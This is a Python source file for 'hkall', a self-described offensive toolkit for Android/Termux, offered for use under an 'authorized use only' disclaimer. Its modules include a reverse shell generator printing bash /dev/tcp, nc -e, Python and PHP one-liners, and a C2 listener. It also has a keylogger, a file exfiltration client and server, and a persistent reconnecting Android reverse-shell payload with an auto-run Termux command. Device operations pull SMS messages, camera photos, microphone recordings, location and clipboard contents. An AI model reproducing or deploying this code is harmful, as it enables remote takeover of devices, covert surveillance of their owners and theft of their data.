#!/usr/bin/env python3
# hkall v0.2.0 - modular offensive toolkit for Android/Termux.
# Authorized use only. You own the consequences.
import socket, threading, os, sys, time, re, select, argparse, subprocess
from datetime import datetime
try:
    import termios, tty
    _TERMIOS = True
except ImportError:
    _TERMIOS = False

VERSION = "0.2.0"
ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data")
os.makedirs(DATA, exist_ok=True)

# ---------------- terminal helpers (TUI) ----------------
def c(s, code):
    return f"\033[{code}m{s}\033[0m" if sys.stdout.isatty() else s

def banner():
    b = r"""
  _  _ _  _ _   _ _
 | |/ / |/ / | | | |
 | ' <| ' <| |_| | |
 |_|\_\__|_\__,_|_|
 hkall v0.2.0
"""
    print(c(b, "36"))

def section(t):
    print(c(f"\n== {t} ==", "34"))

# ---------------- recon ----------------
def parse_ranges(s):
    out = []
    for part in s.split(","):
        a, b = part.split("-") if "-" in part else (part, part)
        out.extend(range(int(a), int(b) + 1))
    return out

def scan_ports(host, ports, timeout=0.5, threads=128):
    found, lock = [], threading.Lock()
    it = iter(ports)
    def worker():
        while True:
            try: p = next(it)
            except StopIteration: return
            s = socket.socket(); s.settimeout(timeout)
            try:
                s.connect((host, p))
                with lock: found.append(p)
            except OSError: pass
            finally: s.close()
    ws = [threading.Thread(target=worker) for _ in range(threads)]
    for w in ws: w.start()
    for w in ws: w.join()
    return sorted(found)

def mod_scan():
    section("PORT SCANNER")
    host = ask("target host: ").strip() or "127.0.0.1"
    ports = ask("ports [1-1000]: ").strip() or "1-1000"
    if ask("all 65535? [y/N] ").strip().lower() == "y": ports = "1-65535"
    try: pl = parse_ranges(ports)
    except ValueError: print("bad range"); return
    print(f"scanning {host} ({len(pl)} ports)...")
    t0 = time.time()
    found = scan_ports(host, pl)
    print(f"open ({len(found)}): {found or 'none'}  [{time.time()-t0:.1f}s]")

def mod_enum():
    section("WEB ENUMERATOR")
    host = ask("target url (http://...): ").strip()
    if not host.startswith("http"): host = "http://" + host
    try:
        import urllib.request
        req = urllib.request.Request(host, headers={"User-Agent": "hkall/0.2"})
        with urllib.request.urlopen(req, timeout=8) as r:
            print(f"status {r.status}")
            for k, v in r.headers.items(): print(f"  {k}: {v}")
            body = r.read().decode("utf-8", "ignore")
            mails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", body)
            secrets = re.findall(r"(?i)(api[._-]?key|token|secret|passw|amazonaws|\.db|BEGIN [A-Z]+ PRIVATE)", body)
            forms = re.findall(r"<(?:script|iframe|form|input)\b[^>]*>", body, re.I)
            print(f"-- finds -- mail:{mails[:5]} secret:{set(secrets)} elements:{len(forms)}")
    except Exception as e:
        print(f"error: {e}")

def mod_whois():
    section("DNS / BANNER LOOKUP")
    host = ask("target host: ").strip()
    try:
        ips = socket.gethostbyname_ex(host)[2]
        print(f"IPs: {ips}")
        for ip in ips:
            try:
                name, _, _ = socket.gethostbyaddr(ip)
                print(f"  {ip} -> {name}")
            except OSError:
                print(f"  {ip} (no PTR)")
    except OSError as e:
        print(f"resolve error: {e}")

# ---------------- shells & c2 ----------------
def mod_shell():
    section("REVERSE SHELL GENERATOR")
    host = ask("your reachable IP: ").strip()
    port = ask("port: ").strip() or "4444"
    langs = {
      "py":   f'python3 -c \'import socket,os,subprocess;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
      "bash": f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
      "nc":   f'nc {host} {port} -e /bin/sh',
      "sh":   f'/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1',
      "php":  f'php -r \'$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    }
    for k, v in langs.items():
        print(f"\n--- {k} ---\n{v}")

def mod_c2():
    section("C2 LISTENER")
    port = int(ask("listen port: ") or "4444")
    def handle(c):
        c.settimeout(None)
        peer = c.getpeername()
        print(f"[+] shell from {peer}  (commands: 'help', 'exit')")
        conn_id = f"{peer[0]}:{peer[1]}"
        clist = []
        while True:
            cmd = ask(f"shell({conn_id})> ")
            if cmd in ("quit", "exit", "back"): break
            if cmd == "help":
                print("commands sent to remote; 'exit' closes"); continue
            c.send((cmd + "\n").encode())
            time.sleep(0.4)
            c.settimeout(2)
            buf = b""
            while True:
                try:
                    d = c.recv(4096)
                    if not d: break
                    buf += d
                    if len(d) < 4096: break
                except socket.timeout: break
            c.settimeout(None)
            sys.stdout.write(buf.decode(errors="replace"))
            sys.stdout.flush()
            clist.append(cmd)
        c.close()
        log(conn_id, "\n".join(clist))
        print(f"[-] {peer} disconnected ({len(clist)} cmds)")
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", port)); srv.listen(5)
    print(f"listening 0.0.0.0:{port} (ctrl-c stop)...")
    try:
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=handle, args=(conn,), daemon=True).start()
    except KeyboardInterrupt:
        pass
    srv.close()

# ---------------- post-exploitation ----------------
def log(name, data, ext="log"):
    fn = os.path.join(DATA, f"{name}.{ext}")
    with open(fn, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {data}\n")
    print(f"saved -> {fn}")

def mod_keylog():
    section("KEYLOGGER (termux/linux)")
    dur = ask("duration sec [0=forever]: ").strip() or "0"
    tk = int(dur) or None
    if not _TERMIOS:
        print("keylogger needs a tty; use a real termux shell"); return
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    tty.setraw(fd)
    start = time.time()
    buf = open(os.path.join(DATA, "keys.log"), "a")
    try:
        while True:
            if tk and time.time() - start > tk: break
            if select.select([sys.stdin], [], [], 0.3)[0]:
                ch = sys.stdin.read(1)
                if ch == "\x03": break
                buf.write(f"{datetime.now().strftime('%H:%M:%S')} {ch!r}\n")
                buf.flush()
    except (KeyboardInterrupt, OSError):
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSANOW, old)
    print(f"saved -> {DATA}/keys.log")

def mod_exfil():
    section("EXFIL CLIENT (send file)")
    server = ask("listener ip: ").strip()
    port = int(ask("listener port: ") or "12345")
    fpath = ask("file to send: ").strip()
    if not os.path.isfile(fpath): print("file not found"); return
    name, size = os.path.basename(fpath), os.path.getsize(fpath)
    s = socket.socket()
    try:
        s.connect((server, port))
        s.sendall(f"{name}|{size}\n".encode())
        if s.recv(1) != b"K":
            print("server rejected"); s.close(); return
        with open(fpath, "rb") as f:
            while chunk := f.read(65536): s.sendall(chunk)
        s.close()
        print(f"sent {name} ({size}b)")
    except OSError as e:
        print(f"error: {e}")

def mod_recv():
    section("EXFIL SERVER")
    port = int(ask("listen port: ") or "12345")
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", port)); srv.listen(1)
    print(f"listening 0.0.0.0:{port}...")
    c, _ = srv.accept()
    meta = b""
    while b"\n" not in meta: meta += c.recv(1)
    name, size = meta.decode().strip().split("|"); size = int(size)
    c.send(b"K")
    dest = os.path.join(DATA, name); got = 0
    with open(dest, "wb") as f:
        while got < size:
            d = c.recv(65536)
            if not d: break
            f.write(d); got += len(d)
    c.close(); srv.close()
    print(f"received {dest} ({got}/{size}b)")

# ---------------- payloads ----------------
def mod_payload():
    section("ANDROID PAYLOAD BUILDER (reconnect reverse shell)")
    host = ask("c2 host: ").strip()
    port = ask("c2 port: ").strip() or "8443"
    out = os.path.join(DATA, "payload.py")
    p = f'''#!/usr/bin/env python3
# hkall payload - change HOST/PORT before use
import socket,subprocess,os,time
HOST,PORT="{host}",{port}
while True:
    try:
        s=socket.socket();s.connect((HOST,int(PORT)))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/system/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
        s.close()
    except Exception: pass
    time.sleep(5)
'''
    with open(out, "w") as f: f.write(p)
    print(f"wrote {out}")

def mod_py2exe():
    section("SHELL PAYLOAD (variants)")
    host = ask("c2 host: ").strip()
    port = ask("c2 port: ").strip() or "4444"
    print("\n[android/termux: run payload when termux opens]")
    print(f'  am start -n com.termux/.app --ez run true --es cmd "cd $HOME/hkall \\u0026\\u0026 python3 data/payload.py \\u0026"')
    print("[linux one-liner]")
    print(f'  python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'')

# ---------------- net tools ----------------
def mod_discover():
    section("LAN HOST DISCOVERER")
    cidr = ask("cidr [192.168.1.0/24]: ").strip() or "192.168.1.0/24"
    try:
        net, mask = cidr.split("/"); mask = int(mask)
    except ValueError:
        print("bad cidr"); return
    base = [int(x) for x in net.split(".")]
    if not (0 <= mask <= 32): print("bad mask"); return
    ips = [net2ip(base, i) for i in range(1, min(2**(32-mask), 2545))]
    PROBE_PORTS = (22, 80, 135, 139, 443, 445, 3389)
    found = set()
    lock = threading.Lock()
    def ping(ip):
        for p in PROBE_PORTS:
            s = socket.socket(); s.settimeout(0.4)
            try:
                s.connect((ip, p))
                with lock: found.add(ip)
                return
            except OSError: pass
            finally: s.close()
    ts = [threading.Thread(target=ping, args=(x,)) for x in ips]
    for t in ts: t.start()
    for t in ts: t.join()
    print(f"up ({len(found)}): {sorted(found) or 'none'}")

def net2ip(base, i):
    b = base[:]
    for j in (3, 2, 1, 0):
        b[j] += i & 0xFF
        i >>= 8
    return ".".join(str(x & 0xFF) for x in b)

# ---------------- device ops (termux-api) ----------------
def _tapi(cmd, *args, timeout=15):
    try:
        r = subprocess.run(["termux-"+cmd, *args], capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None

def tapi_ok():
    return _tapi("battery-status") is not None

def mod_ops():
    section("DEVICE OPS (termux-api)")
    if not tapi_ok():
        print("termux-api NOT installed. Run:  pkg install termux-api")
        print("then enable in the Termux:API android app.")
        print("modules limited to battery/info anyway.")
    else:
        print("termux-api OK")
    print("""
  [a] battery status
  [b] device uptime
  [c] sms inbox (recent 10)
  [d] camera photo (front) -> data/
  [e] location (last known)
  [f] vibration (pattern)
  [g] microphone record 5s -> data/
  [h] clipboard get
""")
    ch = ask("ops> ").strip().lower()
    if ch == "a":
        print(_tapi("battery-status"))
    elif ch == "b":
        print(_tapi("device-info"))
    elif ch == "c":
        print(_tapi("sms-list", "-n", "10"))
    elif ch == "d":
        out = os.path.join(DATA, f"cam_{int(time.time())}.jpg")
        subprocess.run(["termux-camera-photo", "-c", "1", out], timeout=20)
        print(f"photo -> {out}" if os.path.exists(out) else "failed (need camera perm)")
    elif ch == "e":
        r = _tapi("location")
        print(r or "no fix (enable gps)")
    elif ch == "f":
        subprocess.run(["termux-vibrate", "-d", "500", "-f"], timeout=5)
        print("buzzed")
    elif ch == "g":
        out = os.path.join(DATA, f"mic_{int(time.time())}.m4a")
        subprocess.run(["timeout","5","termux-microphone-record","-f",out], timeout=8)
        subprocess.run(["pkill","-f","termux-microphone-record"])
        print(f"rec -> {out}" if os.path.exists(out) else "failed (need mic perm)")
    elif ch == "h":
        print(_tapi("clipboard-get") or "(empty)")
    else:
        print("no op")


# ---------------- module registry ----------------
MODULES = {
    "scan":    ("Port scanner", mod_scan, True),
    "enum":    ("Web enumerator", mod_enum, True),
    "whois":   ("DNS / banner lookup", mod_whois, True),
    "shell":   ("Reverse shell generator", mod_shell, True),
    "c2":      ("C2 listener", mod_c2, True),
    "keylog":  ("Keylogger", mod_keylog, True),
    "exfil":   ("Exfil client", mod_exfil, True),
    "recv":    ("Exfil server", mod_recv, True),
    "payload": ("Android payload builder", mod_payload, True),
    "exe2":    ("Shell payload variants", mod_py2exe, True),
    "lan":     ("LAN host discoverer", mod_discover, True),
    "ops":     ("Device ops (termux-api)", mod_ops, True),
}

def main_tui():
    banner()
    while True:
        section("MODULES")
        ids = list(MODULES)
        for i, k in enumerate(ids):
            name, _, _ = MODULES[k]
            print(f"  [{i+1}] {name}" + (c("  *", "33") if k in ("payload","lan","ops") else ""))
        print("  [0] exit  |  `cli` for terminal one-shot usage")
        try:
            sel = ask(c("hkall> ", "32")).strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if sel in ("0", "q", "exit"): break
        if sel == "cli":
            print("one-shot:  python hkall.py scan HOST -p 1-1000")
            print("           python hkall.py enum URL")
            print("           python hkall.py listen -p 4444")
            print("           python hkall.py recv -p 12345")
            print("           python hkall.py list")
            continue
        try:
            idx = int(sel) - 1
            if 0 <= idx < len(ids):
                key = ids[idx]
                _, _, interactive = MODULES[key]
                if not interactive:
                    print("module is cli-only"); continue
                try:
                    MODULES[key][1]()
                except KeyboardInterrupt:
                    pass
            else:
                print("unknown")
        except ValueError:
            print("unknown")


# ---------------- cli ----------------
GINJ = []  # cli presets queue

def ask(prompt, default=""):
    if GINJ:
        return GINJ.pop(0)
    v = input(prompt + " ").strip()
    return v or default

def cli_one(key, a):
    vals = []
    if a.host:
        vals = [a.host] + ([str(a.port)] if a.port else ["n"])
        if key in ("scan", "whois"): vals[1:] = [a.ports or "1-1000", "n"]
        if key in ("exfil",): vals[1:] = ["", a.port or ""]
    global GINJ
    GINJ = vals + ["n"] * 6
    try:
        MODULES[key][1]()
    except StopIteration:
        pass

def build_parser():
    p = argparse.ArgumentParser(prog="hkall", description="modular offensive toolkit (authorized use only)")
    p.add_argument("-m", "--module", help="run module one-shot: " + ",".join(MODULES))
    p.add_argument("--host", help="host/url/ip preset")
    p.add_argument("--port", type=int, help="port preset")
    p.add_argument("--ports", help="range preset")
    p.add_argument("--list", action="store_true")
    return p

def cli(a):
    if a.list:
        for k in MODULES: print(f"{k:9} {MODULES[k][0]}")
        return
    if a.module in MODULES:
        cli_one(a.module, a)
    else:
        print("unknown module; -m MODULE; `--list` for choices")

def main():
    a = build_parser().parse_args()
    if a.module or a.list:
        cli(a)
    else:
        main_tui()

if __name__ == "__main__":
    main()
